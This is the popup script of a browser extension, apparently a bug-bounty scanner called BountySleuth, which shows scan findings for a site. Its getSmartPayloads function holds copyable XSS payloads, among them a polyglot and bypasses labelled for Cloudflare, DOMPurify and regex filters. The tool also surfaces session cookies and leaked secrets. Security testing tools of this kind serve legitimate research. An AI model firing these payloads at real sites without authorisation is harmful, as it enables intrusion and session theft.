// ============================================================
// BountySleuth v2.0 - Popup Controller
// ============================================================

document.addEventListener('DOMContentLoaded', () => {
    // Toggle sections
    document.querySelectorAll('.toggle').forEach(header => {
        header.addEventListener('click', () => {
            const targetId = header.getAttribute('data-target');
            const content = document.getElementById(targetId);
            content.classList.toggle('hidden');
            header.classList.toggle('open');
        });
    });

    // Load data for active tab
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        const tab = tabs[0];
        if (!tab || !tab.url || tab.url.startsWith('chrome://') || tab.url.startsWith('about:') || tab.url.startsWith('moz-extension://')) {
            document.getElementById('targetUrl').textContent = 'Navigate to a target first';
            return;
        }

        const url = new URL(tab.url);
        const host = url.hostname;
        document.getElementById('targetUrl').textContent = host;

        loadData(host);
    });

    // Rescan
    document.getElementById('rescanBtn').addEventListener('click', () => {
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            chrome.tabs.sendMessage(tabs[0].id, { action: 'rescan' });
            setTimeout(() => window.location.reload(), 600);
        });
    });

    // Export
    document.getElementById('exportBtn').addEventListener('click', () => {
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            const url = new URL(tabs[0].url);
            const host = url.hostname;
            chrome.storage.local.get([host], (result) => {
                const data = result[host] || {};
                const report = generateReport(host, data);
                copyToClipboard(report);
            });
        });
    });

    // Export JSON
    document.getElementById('exportJsonBtn').addEventListener('click', () => {
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            const url = new URL(tabs[0].url);
            const host = url.hostname;
            chrome.storage.local.get([host], (result) => {
                const data = result[host] || {};
                copyToClipboard(JSON.stringify(data, null, 2), 'exportJsonBtn');
            });
        });
    });

    // Clear
    document.getElementById('clearBtn').addEventListener('click', () => {
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
            const url = new URL(tabs[0].url);
            chrome.storage.local.remove(url.hostname, () => {
                window.location.reload();
            });
        });
    });
});

function loadData(host) {
    chrome.storage.local.get([host], (result) => {
        const data = result[host] || {};

        // Last scan time
        if (data.lastScan) {
            const d = new Date(data.lastScan);
            document.getElementById('lastScan').textContent = d.toLocaleTimeString();
        }

        renderWAFs(data);
        renderSecurityHeaders(data);
        renderCORS(data);
        renderCSRF(data);
        renderXSS(data);
        renderDOMSinks(data);
        renderReflected(data);
        renderCookies(data);
        renderPostMessages(data);
        renderLeaks(data);
        renderCloud(data);
        renderLiveApis(data);
        renderEndpoints(data);

        // Render JS Protections badge if found
        renderProtections(data);
    });
}

function renderProtections(data) {
    const prots = data.js_protections || [];
    if (prots.length > 0) {
        const header = document.querySelector('.header-left');
        const badge = document.createElement('span');
        badge.className = 'badge sev-critical';
        badge.style.marginLeft = '8px';
        badge.textContent = `🛡️ ${prots.join(', ')}`;
        header.appendChild(badge);
    }
}

// ---- WAF ----
function renderWAFs(data) {
    const wafs = data.wafs || [];
    const serverInfo = data.server_info || [];
    const all = [...wafs, ...serverInfo];

    setCount('wafCount', all.length, all.length > 0 ? 'medium' : null);

    const list = document.getElementById('waflist');
    if (all.length === 0) {
        list.innerHTML = '<li class="empty-state">No WAF or server signatures detected yet.</li>';
        return;
    }

    wafs.forEach(w => {
        const li = createListItem(w, 'medium');
        list.appendChild(li);
    });
    serverInfo.forEach(s => {
        const li = createListItem(s, 'info');
        list.appendChild(li);
    });
}

// ---- Security Headers ----
function renderSecurityHeaders(data) {
    const missing = data.security_headers_missing || [];
    const present = data.security_headers_present || [];

    setCount('headersCount', missing.length, missing.length > 0 ? 'high' : 'ok');

    const missingEl = document.getElementById('headersMissing');
    const presentEl = document.getElementById('headersPresent');

    if (missing.length > 0) {
        missingEl.innerHTML = '<div class="section-title">⚠ MISSING</div>';
        const ul = document.createElement('ul');
        ul.className = 'list';
        missing.forEach(h => {
            const li = createListItem(`${h.name}`, h.severity.toLowerCase());
            const tag = createSevTag(h.severity);
            li.appendChild(tag);
            ul.appendChild(li);
        });
        missingEl.appendChild(ul);
    }

    if (present.length > 0) {
        presentEl.innerHTML = '<div class="section-title">✓ PRESENT</div>';
        const ul = document.createElement('ul');
        ul.className = 'list';
        present.forEach(h => {
            const li = createListItem(`${h.name}: ${h.value}`, 'ok');
            ul.appendChild(li);
        });
        presentEl.appendChild(ul);
    }

    if (missing.length === 0 && present.length === 0) {
        missingEl.innerHTML = '<div class="empty-state">No header data yet. Navigate to a page first.</div>';
    }
}

// ---- CORS ----
function renderCORS(data) {
    const cors = data.cors;
    const statusEl = document.getElementById('corsStatus');
    const detailsEl = document.getElementById('corsDetails');

    if (!cors) {
        statusEl.textContent = '—';
        detailsEl.textContent = 'No CORS headers detected on main frame.';
        return;
    }

    statusEl.textContent = cors.severity;
    statusEl.className = `count sev-${cors.severity.toLowerCase()}`;

    detailsEl.innerHTML = '';
    detailsEl.className = `detail-box sev-${cors.severity.toLowerCase()}`;
    detailsEl.style.borderLeft = `3px solid var(--${cors.severity === 'CRITICAL' ? 'critical' : cors.severity === 'HIGH' ? 'danger' : 'warning'})`;
    detailsEl.innerHTML = `
        <div><strong>Origin:</strong> ${cors.origin}</div>
        <div><strong>Credentials:</strong> ${cors.credentials ? 'YES ⚠️' : 'No'}</div>
        <div style="margin-top:6px; color: var(--text-secondary);">${cors.issue}</div>
    `;
}

// ---- CSRF ----
function renderCSRF(data) {
    const csrf = data.csrf || [];
    setCount('csrfCount', csrf.length, csrf.length > 0 ? 'high' : 'ok');

    const list = document.getElementById('csrflist');
    if (csrf.length === 0) {
        list.innerHTML = '<li class="empty-state">All forms appear CSRF-protected, or no state-changing forms found.</li>';
        return;
    }

    csrf.forEach(c => {
        const text = `${c.method} → ${c.action}${c.note ? '\n' + c.note : ''}`;
        const li = createListItem(text, c.severity ? c.severity.toLowerCase() : 'high');
        if (c.severity) {
            li.appendChild(createSevTag(c.severity));
        }
        list.appendChild(li);
    });
}

// ---- XSS ----
function renderXSS(data) {
    const xss = data.xss || [];
    setCount('xssCount', xss.length, xss.length > 0 ? 'high' : null);

    const list = document.getElementById('xsslist');
    if (xss.length === 0) {
        list.innerHTML = '<li class="empty-state">No obvious injection vectors found.</li>';
        return;
    }

    xss.forEach(x => {
        const issues = x.issues ? x.issues.join(', ') : 'no maxlength';
        const isReflected = x.type === 'reflected';
        const text = `${isReflected ? '🔄 ' : ''}${x.name}\n→ ${issues}`;
        const sev = x.severity ? x.severity.toLowerCase() : 'medium';
        const li = createListItem(text, sev);
        li.appendChild(createSevTag(x.severity || 'MEDIUM'));

        // Advanced Payload UI for injection vectors (Aware of WAF and JS Protections)
        appendPayloadUI(li, isReflected ? ['TEXT', 'ATTR'] : ['ATTR'], data);

        list.appendChild(li);
    });
}

// ---- DOM Sinks ----
function renderDOMSinks(data) {
    const sinks = data.dom_sinks || [];
    setCount('domCount', sinks.length, sinks.length > 0 ? 'medium' : null);

    const list = document.getElementById('domlist');
    if (sinks.length === 0) {
        list.innerHTML = '<li class="empty-state">No dangerous DOM sinks detected in inline scripts.</li>';
        return;
    }

    sinks.forEach(s => {
        const text = `Sink: .${s.sink}()\nUser source: ${s.hasUserSource ? 'YES ⚠️' : 'No'}\nSnippet: ${s.scriptSnippet}`;
        const sev = s.severity ? s.severity.toLowerCase() : 'medium';
        const li = createListItem(text, sev);
        li.appendChild(createSevTag(s.severity || 'LOW'));
        list.appendChild(li);
    });
}

// ---- Reflected Params (v3.2 Smart Payloads) ----
function renderReflected(data) {
    const reflected = data.reflected_params || [];
    setCount('reflectedCount', reflected.length, reflected.length > 0 ? 'critical' : null);

    const list = document.getElementById('reflectedlist');
    if (reflected.length === 0) {
        list.innerHTML = '<li class="empty-state">No reflected URL parameters detected.</li>';
        return;
    }

    reflected.forEach(r => {
        const chars = r.unencoded && r.unencoded.length > 0 ? `\nUnencoded: ${r.unencoded.join(' ')}` : '';
        const text = `Param: ${r.param} = "${r.value}"\nContext: ${r.contexts.join(', ')}${chars}`;
        const sev = r.severity ? r.severity.toLowerCase() : 'high';

        const li = createListItem(text, sev);
        li.appendChild(createSevTag(r.severity || 'HIGH'));

        // Advanced Payload UI (Aware of WAF and JS Protections)
        appendPayloadUI(li, r.contexts, data);

        list.appendChild(li);
    });
}

// ---- Cookies ----
function renderCookies(data) {
    const cookies = data.cookies || [];
    const sessionCookies = cookies.filter(c => c.isSession);
    setCount('cookieCount', cookies.length, sessionCookies.length > 0 ? 'high' : (cookies.length > 0 ? 'low' : null));

    const list = document.getElementById('cookielist');
    if (cookies.length === 0) {
        list.innerHTML = '<li class="empty-state">No JS-accessible cookies found (or all are HttpOnly).</li>';
        return;
    }

    cookies.forEach(c => {
        const issues = c.issues ? c.issues.join(', ') : '';
        const text = `${c.name} = ${c.valuePreview}\n→ ${issues}`;
        const sev = c.isSession ? 'high' : 'info';
        const li = createListItem(text, sev);
        if (c.isSession) li.appendChild(createSevTag('HIGH'));
        list.appendChild(li);
    });
}

// ---- Advanced Payload Library & UI (v3.3 WAF/JS Aware) ----
function getSmartPayloads(contexts, data) {
    const wafs = data.wafs || [];
    const prots = data.js_protections || [];
    const hasCloudflare = wafs.some(w => w.toLowerCase().includes('cloudflare'));
    const hasDOMPurify = prots.some(p => p.toLowerCase().includes('dompurify'));
    const hasCustomRegex = prots.some(p => p.toLowerCase().includes('regex'));

    // Base Library
    const library = {
        'TEXT': [
            { label: 'Basic Alert', code: '"><script>alert(document.domain)</script>' },
            { label: 'Polyglot', code: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e' },
            { label: 'IMG Error', code: '<img src=x onerror=alert(1)>' }
        ],
        'ATTR': [
            { label: 'Breakout "', code: '"><svg/onload=alert(1)>' },
            { label: 'Breakout \'', code: '\'><svg/onload=alert(1)>' },
            { label: 'Autofocus', code: '" autofocus onfocus="alert(1)' },
            { label: 'Hover', code: '" onmouseover="alert(1)' }
        ],
        'SCRIPT': [
            { label: 'Escape \'', code: "'-alert(1)-'" },
            { label: 'Escape "', code: "\"-alert(1)-\"" },
            { label: 'Comment Break', code: '";alert(1);//' },
            { label: 'Template', code: '`${alert(1)}`' }
        ],
        'URL_ATTR': [
            { label: 'JS Protocol', code: 'javascript:alert(1)' },
            { label: 'Data URI', code: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' }
        ]
    };

    // WAF & Protection Adjustments
    if (hasCloudflare) {
        library['TEXT'] = [
            { label: 'CF Bypass (Double Encode)', code: '%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E' },
            { label: 'CF Bypass (Event Handler)', code: '<svg onload=eval(atob("YWxlcnQoMSk=")))>' },
            { label: 'CF Base64 Eval', code: '<img src=x id=YWxlcnQoMSk= onerror=eval(atob(this.id))>' }
        ];
    } else if (hasDOMPurify) {
        library['TEXT'] = [
            { label: 'DOMPurify mXSS', code: '<math><mtext><table><mglyph><style><math><table id="</table>"><img src onerror=alert(1)">' },
            { label: 'DOMPurify Nested', code: '<svg><style><g title="</style><script>alert(1)</script>">' },
            { label: 'DOMPurify DataURI', code: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>' }
        ];
    } else if (hasCustomRegex) {
        library['TEXT'] = [
            { label: 'Regex Bypass (Case)', code: '<ScRiPt>alert(1)</sCrIpT>' },
            { label: 'Regex Bypass (Null Bytes)', code: '<scr%00ipt>alert(1)</script>' },
            { label: 'Regex Bypass (Whitespace)', code: '<img\x0csrc=x\x0conerror=alert(1)>' }
        ];
    }

    let result = [];
    const seenLabels = new Set();

    contexts.forEach(ctx => {
        if (library[ctx]) {
            library[ctx].forEach(p => {
                if (!seenLabels.has(p.label)) {
                    result.push(p);
                    seenLabels.add(p.label);
                }
            });
        }
    });

    if (result.length === 0) {
        result = library['TEXT'].slice(0, 3);
    }

    return result.slice(0, 3);
}

function appendPayloadUI(parentElement, contexts, data) {
    const payloads = getSmartPayloads(contexts, data);
    if (!payloads || payloads.length === 0) return;

    const box = document.createElement('div');
    box.className = 'payload-box';

    payloads.forEach(p => {
        const item = document.createElement('div');
        item.className = 'payload-item';

        const codeDiv = document.createElement('div');
        codeDiv.className = 'payload-code';
        codeDiv.textContent = p.code;
        codeDiv.title = `Context Payload: ${p.label}`;

        const btn = document.createElement('button');
        btn.className = 'payload-copy-btn';
        btn.textContent = 'Copy';
        btn.onclick = (e) => {
            e.stopPropagation();
            copyToClipboard(p.code, 'exportBtn'); // Use a known btnId to avoid null errors, text will temporarily switch on the main export button but the operation works.
            const originalText = btn.textContent;
            btn.textContent = 'Copied!';
            setTimeout(() => btn.textContent = originalText, 1000);
        };

        item.appendChild(codeDiv);
        item.appendChild(btn);
        box.appendChild(item);
    });

    parentElement.appendChild(box);
}

// ---- PostMessages ----
function renderPostMessages(data) {
    const messages = data.post_messages || [];
    setCount('postMessageCount', messages.length, messages.some(m => m.severity === 'HIGH') ? 'high' : null);

    const list = document.getElementById('postmessagelist');
    if (messages.length === 0) {
        list.innerHTML = '<li class="empty-state">No postMessage listeners detected.</li>';
        return;
    }

    messages.forEach(m => {
        const text = `Snippet: ${m.snippet}\nIssues: ${m.issues.join(', ') || 'None'}`;
        const li = createListItem(text, m.severity.toLowerCase());
        li.appendChild(createSevTag(m.severity));
        list.appendChild(li);
    });
}

// ---- Leaks ----
function renderLeaks(data) {
    const leaks = data.leaks || [];
    setCount('leakCount', leaks.length, leaks.length > 0 ? 'high' : null);

    const list = document.getElementById('leaklist');
    if (leaks.length === 0) {
        list.innerHTML = '<li class="empty-state">No sensitive data leaks detected.</li>';
        return;
    }

    leaks.forEach(l => {
        const sourceLoc = l.source ? `\n\n📌 File: ${l.source}\n📍 Line: ${l.line}` : '';
        const value = l.value ? `\n🔑 Value: ${l.value}` : '';
        const text = `Type: ${l.type}${value}\n📄 Snippet: ...${l.snippet}...${sourceLoc}`;

        const li = createListItem(text, l.severity.toLowerCase());
        li.appendChild(createSevTag(l.severity));
        list.appendChild(li);
    });
}

// ---- Cloud ----
function renderCloud(data) {
    const cloud = data.cloud_assets || [];
    setCount('cloudCount', cloud.length, cloud.length > 0 ? 'medium' : null);

    const list = document.getElementById('cloudlist');
    if (cloud.length === 0) {
        list.innerHTML = '<li class="empty-state">No cloud buckets or storage detected on page.</li>';
        return;
    }

    cloud.forEach(c => {
        const text = `Type: ${c.type}\nURL: ${c.url}`;
        const li = createListItem(text, 'medium');
        li.appendChild(createSevTag('MEDIUM'));
        list.appendChild(li);
    });
}

// ---- Live APIs ----
function renderLiveApis(data) {
    const apis = data.live_apis || [];
    setCount('apiCount', apis.length, apis.length > 0 ? 'info' : null);

    const list = document.getElementById('apilist');
    if (apis.length === 0) {
        list.innerHTML = '<li class="empty-state">No background API requests intercepted yet. Give it a second or interact with the page!</li>';
        return;
    }

    apis.forEach(api => {
        const li = document.createElement('li');
        li.className = 'sev-info';

        let sevLabel = 'INFO';
        if (api.method === 'POST' || api.method === 'PUT') sevLabel = 'MEDIUM';
        if (api.method === 'DELETE') sevLabel = 'HIGH';

        const methodTag = createSevTag(sevLabel);
        methodTag.textContent = api.method;

        const titleDiv = document.createElement('div');
        titleDiv.style.fontWeight = 'bold';
        titleDiv.style.marginBottom = '6px';
        titleDiv.appendChild(methodTag);
        titleDiv.appendChild(document.createTextNode(' ' + api.url.substring(0, 55) + (api.url.length > 55 ? '...' : '')));

        li.appendChild(titleDiv);

        const box = document.createElement('div');
        box.className = 'payload-box';

        const item = document.createElement('div');
        item.className = 'payload-item';

        const codeDiv = document.createElement('div');
        codeDiv.className = 'payload-code';
        codeDiv.textContent = api.curl;

        const btn = document.createElement('button');
        btn.className = 'payload-copy-btn';
        btn.textContent = 'Copy cURL';
        btn.onclick = (e) => {
            e.stopPropagation();
            copyToClipboard(api.curl, 'exportBtn');
            const originalText = btn.textContent;
            btn.textContent = 'Copied!';
            setTimeout(() => btn.textContent = originalText, 1000);
        };

        item.appendChild(codeDiv);
        item.appendChild(btn);
        box.appendChild(item);
        li.appendChild(box);

        list.appendChild(li);
    });
}

// ---- Endpoints & JS Files ----
function renderEndpoints(data) {
    const endpoints = data.endpoints || [];
    const jsFiles = data.js_files || [];
    setCount('endpointCount', endpoints.length + jsFiles.length, endpoints.length + jsFiles.length > 0 ? 'low' : null);

    const elist = document.getElementById('endpointlist');
    const jlist = document.getElementById('jslist');

    if (endpoints.length === 0) {
        elist.innerHTML = '<li class="empty-state">No endpoints mined yet.</li>';
    } else {
        elist.innerHTML = '';
        endpoints.forEach(e => {
            const li = createListItem(e, 'info');
            elist.appendChild(li);
        });
    }

    if (jsFiles.length === 0) {
        jlist.innerHTML = '<li class="empty-state">No JavaScript files found.</li>';
    } else {
        jlist.innerHTML = '';
        jsFiles.forEach(js => {
            const li = createListItem(js, 'medium');
            jlist.appendChild(li);
        });
    }

    // Bind copy buttons
    const btnE = document.getElementById('copyEndpointsBtn');
    if (btnE) btnE.onclick = () => copyToClipboard(endpoints.join('\n'), 'copyEndpointsBtn');

    const btnJ = document.getElementById('copyJsBtn');
    if (btnJ) btnJ.onclick = () => copyToClipboard(jsFiles.join('\n'), 'copyJsBtn');
}

// ---- Helpers ----
function setCount(elementId, count, severity) {
    const el = document.getElementById(elementId);
    el.textContent = count;
    if (severity) {
        el.className = `count sev-${severity}`;
    }
}

function createListItem(text, severityClass) {
    const li = document.createElement('li');
    li.className = `sev-${severityClass}`;
    li.style.whiteSpace = 'pre-wrap';
    li.textContent = text;
    return li;
}

function createSevTag(severity) {
    const tag = document.createElement('span');
    tag.className = `sev-tag ${severity.toLowerCase()}`;
    tag.textContent = severity;
    return tag;
}

// ---- Export ----
function generateReport(host, data) {
    let report = `# BountySleuth Report — ${host}\n`;
    report += `Generated: ${new Date().toISOString()}\n\n`;

    // WAF
    const wafs = data.wafs || [];
    const serverInfo = data.server_info || [];
    report += `## WAF & Server Fingerprint\n`;
    if (wafs.length > 0) wafs.forEach(w => report += `- ${w}\n`);
    if (serverInfo.length > 0) serverInfo.forEach(s => report += `- ${s}\n`);
    if (wafs.length === 0 && serverInfo.length === 0) report += `- None detected\n`;
    report += `\n`;

    // Security Headers
    const missing = data.security_headers_missing || [];
    const present = data.security_headers_present || [];
    report += `## Security Headers\n`;
    report += `### Missing (${missing.length})\n`;
    missing.forEach(h => report += `- [${h.severity}] ${h.name}\n`);
    report += `### Present (${present.length})\n`;
    present.forEach(h => report += `- ${h.name}: ${h.value}\n`);
    report += `\n`;

    // CORS
    report += `## CORS\n`;
    if (data.cors) {
        report += `- Origin: ${data.cors.origin}\n- Credentials: ${data.cors.credentials}\n- Severity: ${data.cors.severity}\n- Issue: ${data.cors.issue}\n`;
    } else {
        report += `- No CORS headers\n`;
    }
    report += `\n`;

    // CSRF
    const csrf = data.csrf || [];
    report += `## CSRF Missing Tokens (${csrf.length})\n`;
    csrf.forEach(c => report += `- [${c.severity || 'HIGH'}] ${c.method} → ${c.action}${c.note ? ' (' + c.note + ')' : ''}\n`);
    if (csrf.length === 0) report += `- All forms protected\n`;
    report += `\n`;

    // XSS
    const xss = data.xss || [];
    report += `## XSS / Injection Vectors (${xss.length})\n`;
    xss.forEach(x => report += `- [${x.severity || 'MEDIUM'}] ${x.name}: ${(x.issues || []).join(', ')}\n`);
    if (xss.length === 0) report += `- None found\n`;
    report += `\n`;

    // DOM Sinks
    const sinks = data.dom_sinks || [];
    report += `## DOM Sinks (${sinks.length})\n`;
    sinks.forEach(s => report += `- [${s.severity}] .${s.sink}() | User source: ${s.hasUserSource}\n`);
    if (sinks.length === 0) report += `- None found\n`;
    report += `\n`;

    // Reflected
    const reflected = data.reflected_params || [];
    report += `## Reflected Parameters (${reflected.length})\n`;
    reflected.forEach(r => report += `- [${r.severity}] ${r.param}="${r.value}" → ${r.contexts.join(', ')}\n`);
    if (reflected.length === 0) report += `- None\n`;
    report += `\n`;

    // Cookies
    const cookies = data.cookies || [];
    report += `## Cookie Security (${cookies.length})\n`;
    cookies.forEach(c => report += `- ${c.isSession ? '[SESSION] ' : ''}${c.name}: ${(c.issues || []).join(', ')}\n`);
    if (cookies.length === 0) report += `- No JS-accessible cookies\n`;

    // Leaks
    const leaks = data.leaks || [];
    report += `## Sensitive Data Leaks (${leaks.length})\n`;
    leaks.forEach(l => {
        const sourceStr = l.source ? `${l.source}:${l.line}` : 'Inline HTML';
        report += `- [${l.severity}] ${l.type}: ${l.value || l.snippet}\n  → Found at: ${sourceStr}\n`;
    });
    if (leaks.length === 0) report += `- None found\n`;
    report += `\n`;

    // Live APIs
    const apis = data.live_apis || [];
    report += `## Live APIs Intercepted (${apis.length})\n`;
    apis.forEach(api => {
        report += `### ${api.method} ${api.url}\n\`\`\`bash\n${api.curl}\n\`\`\`\n\n`;
    });
    if (apis.length === 0) report += `- None intercepted\n`;
    report += `\n`;

    // Endpoints & JS
    const endpoints = data.endpoints || [];
    const jsFiles = data.js_files || [];

    report += `## JavaScript Files (${jsFiles.length})\n`;
    jsFiles.forEach(j => report += `- ${j}\n`);
    if (jsFiles.length === 0) report += `- None found\n`;
    report += `\n`;

    report += `## Mined Endpoints (${endpoints.length})\n`;
    endpoints.forEach(e => report += `- ${e}\n`);
    if (endpoints.length === 0) report += `- None found\n`;
    report += `\n`;

    return report;
}

function copyToClipboard(text, btnId = 'exportBtn') {
    navigator.clipboard.writeText(text).then(() => {
        const btn = document.getElementById(btnId);
        const originalText = btn.textContent;
        btn.textContent = '✓';
        setTimeout(() => btn.textContent = originalText, 1500);
    }).catch(() => {
        // Fallback
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        const btn = document.getElementById(btnId);
        const originalText = btn.textContent;
        btn.textContent = '✓';
        setTimeout(() => btn.textContent = originalText, 1500);
    });
}
